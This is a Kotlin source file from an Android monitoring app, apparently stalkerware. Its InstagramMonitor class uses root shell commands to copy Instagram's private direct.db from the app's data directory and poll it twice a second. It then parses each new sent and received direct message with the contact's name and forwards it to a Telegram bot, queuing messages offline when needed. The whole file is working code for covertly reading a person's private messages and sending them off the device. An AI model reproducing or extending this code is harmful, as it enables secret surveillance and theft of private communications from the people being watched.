package com.system.superiormonitor.monitor

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import com.system.superiormonitor.bot.OfflineManager
import com.system.superiormonitor.bot.TelegramApi
import com.system.superiormonitor.data.PrefsManager
import com.system.superiormonitor.core.LogCategory
import com.system.superiormonitor.core.LogLevel
import com.system.superiormonitor.core.LogManager
import com.topjohnwu.superuser.Shell
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.debounce
import kotlinx.coroutines.flow.flow
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class InstagramMonitor(
    private val context: Context,
    private val sendTelegram: (String, String?) -> Boolean
) {
    companion object {
        private const val TAG = "InstagramMonitor"
        private const val IG_PACKAGE = "com.instagram.android"
        private const val DEFAULT_IG_DB_DIR = "/data/data/$IG_PACKAGE/databases"
        private const val DEBOUNCE_MS = 1500L
        private const val POLL_INTERVAL = "0.5"

        fun resolveIgDbDir(): String {
            try {
                val result = Shell.cmd("dumpsys package $IG_PACKAGE | grep 'dataDir='").exec()
                if (result.isSuccess) {
                    val dataDir = result.out
                        .firstOrNull { it.contains("dataDir=") }
                        ?.trim()
                        ?.substringAfter("dataDir=")
                        ?.trim()
                    if (!dataDir.isNullOrBlank()) {
                        val dbDir = "$dataDir/databases"
                        val check = Shell.cmd("ls $dbDir/direct.db 2>/dev/null").exec()
                        if (check.isSuccess && check.out.isNotEmpty()) {
                            return dbDir
                        }
                    }
                }
            } catch (_: Exception) { }

            val alternativePaths = listOf(
                "/data/user/0/$IG_PACKAGE/databases",
                "/data/data/$IG_PACKAGE/databases"
            )
            for (path in alternativePaths) {
                try {
                    val check = Shell.cmd("ls $path/direct.db 2>/dev/null").exec()
                    if (check.isSuccess && check.out.isNotEmpty()) {
                        return path
                    }
                } catch (_: Exception) { }
            }
            return DEFAULT_IG_DB_DIR
        }

        fun isInstagramInstalled(context: Context): Boolean {
            return try {
                val result = Shell.cmd("pm path $IG_PACKAGE").exec()
                result.isSuccess && result.out.any { it.contains("package:") }
            } catch (e: Exception) {
                try {
                    context.packageManager.getPackageInfo(IG_PACKAGE, 0)
                    true
                } catch (e2: Exception) {
                    false
                }
            }
        }

        fun checkInstagramDatabase(): Pair<Boolean, String> {
            return try {
                val dbDir = resolveIgDbDir()
                val result = Shell.cmd("ls $dbDir/direct.db 2>/dev/null").exec()
                if (result.isSuccess && result.out.isNotEmpty()) {
                    Pair(true, "Database found at $dbDir")
                } else {
                    Pair(false, "Instagram direct.db was not found. The app may not have been opened yet, or the data directory is inaccessible.")
                }
            } catch (e: Exception) {
                Pair(false, "Unable to verify Instagram database: ${e.message}")
            }
        }

        const val IG_QUERY = """
            WITH me AS (
                SELECT user_id AS my_id
                FROM session
            )
            SELECT
                m._id AS id,
                CAST(m.message AS TEXT) AS message_json,
                CAST(t.thread_info AS TEXT) AS thread_info_json,
                CAST(me.my_id AS TEXT) AS session_my_id
            FROM messages AS m
            JOIN threads AS t ON m.thread_id = t.thread_id
            CROSS JOIN me
            WHERE m.timestamp > ?
            ORDER BY m.timestamp ASC
        """
    }

    private val workDir: File by lazy {
        val dir = File(context.cacheDir, "instagram/watchdir")
        dir.also { if (!it.exists()) it.mkdirs() }
    }

    private val prefsManager by lazy { PrefsManager.getInstance(context) }
    private var watcherJob: Job? = null
    private var igDbDir: String = DEFAULT_IG_DB_DIR

    fun start(scope: CoroutineScope) {
        if (watcherJob?.isActive == true) return

        watcherJob = scope.launch(Dispatchers.IO) {
            try {
                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Starting Instagram monitor...")

                if (!isInstagramInstalled(context)) {
                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Instagram is not installed on this device. Monitor aborted.")
                    return@launch
                }

                val (dbAvailable, dbReason) = checkInstagramDatabase()
                if (!dbAvailable) {
                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] $dbReason Monitor aborted.")
                    return@launch
                }

                igDbDir = resolveIgDbDir()
                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Resolved Instagram DB path: $igDbDir")

                syncDatabase()
                val currentMaxId = getMaxMessageId()

                if (currentMaxId > 0 && prefsManager.instagramLastProcessedId > currentMaxId) {
                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Database wipe detected (Stored TS: ${prefsManager.instagramLastProcessedId}, Current Max TS: $currentMaxId). Resetting baseline.")
                }

                prefsManager.instagramLastProcessedId = currentMaxId
                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Baseline established (TS: ${prefsManager.instagramLastProcessedId}). Watching for live messages...")

                createWatcherFlow()
                    .debounce(DEBOUNCE_MS)
                    .collect {
                        try {
                            processNewMessages()
                        } catch (e: CancellationException) {
                            throw e
                        } catch (e: Exception) {
                            logToFile("Error processing messages: ${e.message}\n${e.stackTraceToString()}")
                            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Error processing messages: ${e.message}", LogLevel.ERROR)
                        }
                    }
            } catch (e: CancellationException) {
                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Monitor cancelled.")
            } catch (e: Exception) {
                logToFile("Fatal error: ${e.message}\n${e.stackTraceToString()}")
                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Fatal error: ${e.message}", LogLevel.ERROR)
            }
        }
    }

    fun stop() {
        watcherJob?.cancel()
        watcherJob = null
        LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Monitor stopped.")
    }

    private fun createWatcherFlow(): Flow<Unit> = flow {
        val dbPath = "$igDbDir/direct.db"
        LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Starting native Kotlin stat polling every ${POLL_INTERVAL}s.")

        var lastStat = Shell.cmd("stat -c '%Y' $dbPath 2>/dev/null || echo 0").exec().out.joinToString("").trim()

        while (currentCoroutineContext().isActive) {
            val currentStat = Shell.cmd("stat -c '%Y' $dbPath 2>/dev/null || echo 0").exec().out.joinToString("").trim()
            if (currentStat.isNotEmpty() && currentStat != "0" && currentStat != lastStat) {
                lastStat = currentStat
                emit(Unit)
            }
            delay((POLL_INTERVAL.toDouble() * 1000).toLong())
        }
    }

    private fun logToFile(message: String) {
        try {
            val logDir = context.getExternalFilesDir("instagram/logs") ?: File(context.cacheDir, "instagram/logs")
            if (!logDir.exists()) logDir.mkdirs()
            val logFile = File(logDir, "logs.txt")
            val time = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
            FileWriter(logFile, true).use { writer ->
                writer.append("[$time] $message\n")
            }
        } catch (e: Exception) {
            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Failed to write to log file: ${e.message}", LogLevel.ERROR)
        }
    }

    private fun syncDatabase() {
        val destPath = workDir.absolutePath
        val uid = android.os.Process.myUid()

        Shell.cmd("rm -f \"$destPath\"/direct.db*").exec()

        File(destPath, "direct.db").createNewFile()
        File(destPath, "direct.db-journal").createNewFile()
        File(destPath, "direct.db-shm").createNewFile()
        File(destPath, "direct.db-wal").createNewFile()

        val result = Shell.cmd(
            "cat \"$igDbDir/direct.db\" > \"$destPath/direct.db\"",
            "cat \"$igDbDir/direct.db-journal\" > \"$destPath/direct.db-journal\" 2>/dev/null || true",
            "cat \"$igDbDir/direct.db-shm\" > \"$destPath/direct.db-shm\" 2>/dev/null || true",
            "cat \"$igDbDir/direct.db-wal\" > \"$destPath/direct.db-wal\" 2>/dev/null || true",
            "chown $uid:$uid \"$destPath\"/direct.db*",
            "chmod 666 \"$destPath\"/direct.db*"
        ).exec()

        if (!result.isSuccess) {
            val errMsg = "DB sync failed: ${result.err.joinToString()}"
            logToFile(errMsg)
            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] $errMsg", LogLevel.ERROR)
        }
    }

    private fun getMaxMessageId(): Long {
        val dbFile = File(workDir, "direct.db")
        if (!dbFile.exists()) return 0

        return try {
            val db = SQLiteDatabase.openDatabase(
                dbFile.absolutePath, null,
                SQLiteDatabase.OPEN_READWRITE or SQLiteDatabase.NO_LOCALIZED_COLLATORS
            )
            db.use { database ->
                val cursor = database.rawQuery("SELECT COALESCE(MAX(timestamp), 0) FROM messages", null)
                cursor.use { c ->
                    if (c.moveToFirst()) c.getLong(0) else 0L
                }
            }
        } catch (e: Exception) {
            val errMsg = "Error reading max ID: ${e.message}\n${e.stackTraceToString()}"
            logToFile(errMsg)
            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] $errMsg", LogLevel.ERROR)
            0L
        }
    }

    private suspend fun processNewMessages() {
        Thread.sleep(150)
        syncDatabase()

        val dbFile = File(workDir, "direct.db")
        if (!dbFile.exists()) {
            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] direct.db not found after sync.", LogLevel.ERROR)
            return
        }

        try {
            val db = SQLiteDatabase.openDatabase(
                dbFile.absolutePath, null,
                SQLiteDatabase.OPEN_READWRITE or SQLiteDatabase.NO_LOCALIZED_COLLATORS
            )

            db.use { database ->
                val rows = queryNewMessages(database)
                val processedIds = mutableSetOf<Long>()

                for (row in rows) {
                    // Prevent duplicate rows caused by json_each multiple recipients in group chats
                    if (!processedIds.contains(row.id) && row.tsMicros > prefsManager.instagramLastProcessedId) {
                        processedIds.add(row.id)
                        val formatted = formatOutputMessage(row)
                        OfflineManager.sendOrQueue(
                            context = context,
                            message = formatted,
                            offlineSubdir = "instagram",
                            offlineFileName = "offline_instagram.txt",
                            sender = sendTelegram
                        )
                        prefsManager.instagramLastProcessedId = row.tsMicros
                    }
                }

                if (processedIds.isNotEmpty()) {
                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Forwarded/Queued ${processedIds.size} new message(s).")
                }
            }
        } catch (e: Exception) {
            val errMsg = "Error processing messages: ${e.message}\n${e.stackTraceToString()}"
            logToFile(errMsg)
            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] $errMsg", LogLevel.ERROR)
        }
    }

    private data class MessageRow(
        val id: Long,
        val tsMicros: Long,
        val fromMe: Int,
        val username: String?,
        val fullName: String?,
        val content: String?
    )

    private suspend fun queryNewMessages(db: SQLiteDatabase): List<MessageRow> {
        val rows = mutableListOf<MessageRow>()
        try {
            val cursor = db.rawQuery(IG_QUERY, arrayOf(prefsManager.instagramLastProcessedId.toString()))
            cursor.use { c ->
                while (c.moveToNext()) {
                    kotlinx.coroutines.yield()
                    val id = c.getLong(c.getColumnIndexOrThrow("id"))
                    
                    val msgIdx = c.getColumnIndexOrThrow("message_json")
                    val messageJson = if (c.getType(msgIdx) == android.database.Cursor.FIELD_TYPE_BLOB) {
                        c.getBlob(msgIdx)?.let { String(it, Charsets.UTF_8) }
                    } else {
                        c.getString(msgIdx)
                    }
                    
                    val threadIdx = c.getColumnIndexOrThrow("thread_info_json")
                    val threadInfoJson = if (c.getType(threadIdx) == android.database.Cursor.FIELD_TYPE_BLOB) {
                        c.getBlob(threadIdx)?.let { String(it, Charsets.UTF_8) }
                    } else {
                        c.getString(threadIdx)
                    }
                    
                    val sessionIdx = c.getColumnIndexOrThrow("session_my_id")
                    val sessionMyId = if (c.getType(sessionIdx) == android.database.Cursor.FIELD_TYPE_BLOB) {
                        c.getBlob(sessionIdx)?.let { String(it, Charsets.UTF_8) }
                    } else {
                        c.getString(sessionIdx)
                    }

                    var tsMicros = 0L
                    var fromMe = 0
                    var username: String? = null
                    var fullName: String? = null
                    var content: String? = null

                    try {
                        val msgObj = org.json.JSONObject(messageJson ?: "{}")
                        tsMicros = msgObj.optLong("timestamp", 0L)
                        val userId = msgObj.optString("user_id")
                        fromMe = if (userId == sessionMyId) 1 else 0

                        val itemType = msgObj.optString("item_type")
                        content = when (itemType) {
                            "text" -> msgObj.optString("text")
                            "xma_clip" -> "🎬 Reel Shared"
                            "link" -> "🔗 Link"
                            "video_call_event" -> "📹 Video Call"
                            else -> "[Unsupported/Media]"
                        }
                    } catch(e: Exception) {}

                    try {
                        val threadObj = org.json.JSONObject(threadInfoJson ?: "{}")
                        val recipients = threadObj.optJSONArray("recipients")
                        if (recipients != null && recipients.length() > 0) {
                            val r0 = recipients.getJSONObject(0)
                            username = r0.optString("username")
                            fullName = r0.optString("full_name")
                        }
                    } catch(e: Exception) {}

                    rows.add(
                        MessageRow(
                            id = id,
                            tsMicros = tsMicros,
                            fromMe = fromMe,
                            username = username,
                            fullName = fullName,
                            content = content
                        )
                    )
                }
            }
        } catch (e: Exception) {
            val errMsg = "Query failed: ${e.message}\n${e.stackTraceToString()}"
            logToFile(errMsg)
            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] $errMsg", LogLevel.ERROR)
        }
        return rows
    }

    private val timeFormatter = SimpleDateFormat("HH:mm:ss | dd/MM/yyyy", Locale.getDefault())

    private fun formatOutputMessage(row: MessageRow): String {
        val direction = if (row.fromMe == 1) "Sent" else "Received"
        val msg = if (row.content.isNullOrBlank()) "[Empty or Media]" else row.content
        
        // Convert micros to millis
        val millis = row.tsMicros / 1000
        val timeFormatted = timeFormatter.format(Date(millis))

        val contactName = row.fullName ?: row.username ?: "Unknown User"
        val usernameStr = row.username?.let { "@$it" } ?: ":NA"
        
        val sentBy: String
        val toTarget: String

        if (row.fromMe == 1) {
            sentBy = "Me"
            toTarget = contactName
        } else {
            sentBy = contactName
            toTarget = "Me"
        }

        val safeSentBy = TelegramApi.escapeMarkdown(sentBy)
        val safeToTarget = TelegramApi.escapeMarkdown(toTarget)
        val safeUsername = TelegramApi.escapeMarkdown(usernameStr)
        val safeMsg = TelegramApi.escapeMarkdown(msg)

        return com.system.superiormonitor.bot.BotMessages.Alerts.buildInstagramMessage(
            direction, timeFormatted, safeSentBy, safeToTarget, safeUsername, safeMsg
        )
    }
}
